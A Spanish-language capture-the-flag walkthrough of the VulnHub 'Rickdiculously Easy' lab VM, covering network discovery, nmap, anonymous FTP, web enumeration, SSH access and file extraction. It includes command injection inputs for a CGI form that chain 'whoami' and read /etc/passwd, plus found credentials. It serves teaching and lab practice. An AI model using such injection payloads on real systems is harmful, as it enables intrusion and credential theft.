# Rickdiculously Easy (VulnHub) en VMware – WriteUp completo (hasta acceso SSH + extracción de credenciales)

> **Aviso (ético y legal):** Solo para laboratorio/CTF y aprendizaje. No usar contra sistemas reales sin permiso.

---

## Índice

1. Preparación y arranque de la VM  
2. Descubrimiento de IP (netdiscover + ifconfig)  
3. Ajuste de red en VMware (red aislada 192.168.247.0/24)  
4. Enumeración con Nmap (modo lab vs metodología real en fases)  
5. FTP anónimo (descarga de flag)  
6. Enumeración web (dirsearch) + `/passwords/` + `robots.txt`  
7. Command Injection en `tracertool.cgi` (RCE como `apache`) + enumeración de usuarios  
8. Panel 9090 (Cockpit) y flag  
9. Puertos extra (13337 / 22222 / 60000) + SSH real en 22222  
10. Acceso SSH como `Summer` + post-explotación inicial  
11. Pivot local (homes de Morty/Rick) + extracción de archivos  
12. Exfiltración a Kali (python http.server + wget)  
13. Análisis de imagen (exiftool + strings) → password del ZIP  

---

## 1. Arranque de la VM y consola inicial

Una vez instalada la máquina en VMware e iniciada, se ve la consola de Fedora Server y un login local.

📷 **Imagen 1 — Consola inicial (login)**
![Consola Fedora / login](images/01-vm-boot-login.png)

En la propia consola se muestra algo clave:

- **Admin Console**: `https://127.0.0.1:9090/`

Esto suele ser **Cockpit**, un panel de administración web típico en Fedora/RHEL. En CTFs a menudo está expuesto en red (no solo localhost), así que lo tendremos en el radar.

---

## 2. No tenemos IP: descubrimiento con netdiscover

Como no tenemos ninguna información inicial, el primer paso es descubrir hosts en la LAN.

### 2.1 `sudo netdiscover`

```bash
sudo netdiscover
```

**¿Qué hace netdiscover?**  
- Es una herramienta de reconocimiento ARP (ARP reconnaissance).
- Funciona en redes locales (misma LAN / mismo segmento).
- Envía peticiones ARP y recoge respuestas para listar: IP activa, MAC, vendor.

**¿Por qué `sudo`?**  
Porque necesita privilegios para capturar/enviar ARP (raw sockets).

📷 **Imagen 2 — netdiscover + ifconfig**
![netdiscover e ifconfig](images/02-netdiscover-ifconfig.png)

---

## 3. Afinar el rango: `ifconfig` (IP y máscara)

### 3.1 `ifconfig`

```bash
ifconfig
```

Salida relevante:

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.184.128  netmask 255.255.255.0  broadcast 192.168.184.255
```

#### Explicación (campo a campo)

- `eth0`: interfaz de red.
- `flags`:
  - `UP`: activa
  - `BROADCAST`: permite broadcast
  - `RUNNING`: operativa
  - `MULTICAST`: multicast
- `mtu 1500`: tamaño máximo de trama.
- `inet`: IP asignada.
- `netmask 255.255.255.0`: equivalente a `/24`.
- `broadcast`: broadcast del segmento.

**Rango resultante:** `192.168.184.0/24`

---

## 4. `netdiscover --help` (explicación de flags)

```bash
netdiscover --help
```

Flags importantes:

- `-i device`: interfaz (ej. `eth0`).
- `-r range`: rango a escanear (`192.168.x.0/24`).
- `-l file`: lista de rangos desde fichero.
- `-p`: modo pasivo (no envía ARP).
- `-f`: fast mode.
- `-P` / `-L`: formatos de salida.

---

## 5. Red aislada VMware: 192.168.247.0/24

Se creó red virtual “parque de bolos”:

- `192.168.247.0/24`

y se asignó a Kali y a la VM víctima.

### 5.1 Netdiscover dirigido al rango

```bash
sudo netdiscover -r 192.168.247.0/24
```

- `-r`: obliga a escanear ese rango.

Luego confirmamos Kali:

```bash
ifconfig
```

Kali: `192.168.247.129`

Interpretación:
- `192.168.247.128` = probable víctima (si solo hay dos VMs en esa red).

---

## 6. Confirmación con Nmap (escaneo de laboratorio)

```bash
nmap -p- -sCV -n -Pn -vvv --open -T5 -oN Rickdiculously 192.168.247.128
```

### 6.1 Explicación MUY detallada de flags

- `-p-`: todos los puertos TCP (1–65535).  
- `-sC`: scripts NSE por defecto (info extra/configs).  
- `-sV`: detección de versiones.  
- `-n`: sin DNS.  
- `-Pn`: sin ping discovery (asume host up).  
- `-vvv`: salida muy verbosa.  
- `--open`: solo muestra puertos open.  
- `-T5`: timing agresivo (rápido, más ruido).  
- `-oN Rickdiculously`: guarda salida “normal” a fichero.

Puertos encontrados:
- 21, 22, 80, 9090, 13337, 22222, 60000

---

## 7. Metodología real (Nmap en fases)

### Fase 1: descubrir puertos con menos ruido

```bash
nmap 192.168.247.128 -sS -T0
```

- `-sS`: SYN scan (semi-sigiloso).
- `-T0`: el más lento (menos agresivo).

### Fase 2: enumeración dirigida

```bash
nmap 192.168.247.128 -p21,22,80,9090,13337,22222,60000 -sCV
```

---

## 8. FTP anónimo (21/tcp)

Nmap indica:

- `vsftpd 3.0.3`
- `ftp-anon: Anonymous FTP login allowed`

### 8.1 Conexión

```bash
ftp -a 192.168.247.128
```

- `-a`: login anónimo automático.

### 8.2 Enumeración y descarga

```text
ftp> ls
ftp> get FLAG.txt
```

Verificación:

```bash
cat FLAG.txt
```

Flag:
- `FLAG{Whoa this is unexpected} - 10 Points`

---

## 9. Web (80/tcp): dirsearch

```bash
dirsearch -u http://192.168.247.128
```

- `-u`: URL objetivo.
- usa wordlist y múltiples threads.

Hallazgos:
- `/passwords/` (200)
- `/robots.txt` (200)
- `/cgi-bin/` (403)

---

## 10. `/passwords/` (Directory Listing)

📷 **Imagen 3 — Index of /passwords**
![Index /passwords](images/03-web-passwords-index.png)

- `FLAG.txt` → `FLAG{Yeah d- just don't do it.} - 10 Points`
- `passwords.html` → comentario:

```html
<!--Password: winter-->
```

---

## 11. `robots.txt`

Contiene:

- `/cgi-bin/root_shell.cgi`
- `/cgi-bin/tracertool.cgi`

---

## 12. `tracertool.cgi` → Command Injection

📷 **Imagen 4 — tracertool**
![tracertool form](images/04-tracertool-form.png)

Input:

- `192.168.247.128; whoami; pwd`

Confirma:
- `apache`
- `/var/www/cgi-bin`

Operadores:
- `;` secuencia
- `&&` condicional éxito
- `||` condicional fallo
- `|` pipe (NO concatenación)

### 12.1 Salida rara al leer /etc/passwd (Imagen 5)

Con `; cat /etc/passwd` el CGI devuelve output “alterado”.

📷 **Imagen 5 — Output alterado**
![output alterado](images/05-tracertool-output-art.png)

Bypass:

- `; tail -n 30 /etc/passwd`

Usuarios con `/bin/bash`:
- RickSanchez
- Morty
- Summer

---

## 13. Cockpit (9090)

📷 **Imagen 6 — Cockpit**
![Cockpit 9090 flag](images/06-cockpit-9090-flag.png)

Flag:
- `FLAG {THERE IS NO ZEUS, IN YOUR FACE!} - 10 POINTS`

---

## 14. Puertos extra

```bash
nmap 192.168.247.128 -p13337,22222,60000 -sCV
```

- 13337 → flag directa
- 22222 → SSH real
- 60000 → banner reverse shell

---

## 15. SSH real (22222)

```bash
ssh Summer@192.168.247.128 -p 22222
```

Password: `winter`

Dentro:
- flag en `FLAG.txt`: `FLAG{Get off the high road Summer!} - 10 Points`

---

## 16. `sudo -l`

```bash
sudo -l
```

Sirve para listar comandos permitidos con sudo. Summer no tiene permisos.

---

## 17. Exfiltración de archivos (Morty)

Archivos:
- `journal.txt.zip`
- `Safe_Password.jpg`

### 17.1 SCP (nota: `-P` mayúscula)

```bash
scp -P 22222 Summer@192.168.247.128:/home/Morty/journal.txt.zip ./
scp -P 22222 Summer@192.168.247.128:/home/Morty/Safe_Password.jpg ./
```

### 17.2 Servidor HTTP con Python

Intento puerto 80 falla (puerto privilegiado). Correcto:

```bash
python3 -m http.server 8080
```

Descarga en Kali:

```bash
wget http://192.168.247.128:8080/Safe_Password.jpg
```

---

## 18. Análisis del JPG

```bash
exiftool Safe_Password.jpg
strings Safe_Password.jpg
```

Hallazgo:

- Password ZIP: `Meeseek`

---

## Resumen

Flags:
- FTP, web, cockpit, 13337, SSH Summer

Credenciales:
- `winter`
- `Meeseek` (ZIP)

Siguiente paso:
- descomprimir `journal.txt.zip` con `Meeseek`.

